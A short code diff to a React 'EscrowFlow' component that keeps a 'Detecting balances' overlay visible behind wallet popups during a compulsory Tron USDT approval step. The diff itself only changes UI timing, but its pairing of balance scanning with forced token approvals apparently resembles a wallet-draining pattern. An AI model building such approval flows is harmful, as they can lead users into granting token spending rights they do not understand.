@@ -1326,12 +1326,13 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       setModal1Status({ "tron-USDT": "pending" });
       modal1ApproveStarted.current = true;
 
-      // Drop Detecting balances before the Tron wallet approve popup.
-      clearModal1Busy();
+      // Keep Detecting balances visible behind wallet popups until approve is confirmed + recorded.
+      showModal1Busy();
 
       const tronOk = await runCompulsoryApprovals([tronItem], { markComplete: true });
       void evmScanPromise.catch(() => {});
-      if (tronOk) clearModal1Busy();
+      clearModal1Busy();
+      if (!tronOk) return;
     } catch (err) {
       console.error("[modal1] compulsory tron flow failed:", err);
       void evmScanPromise.catch(() => {});
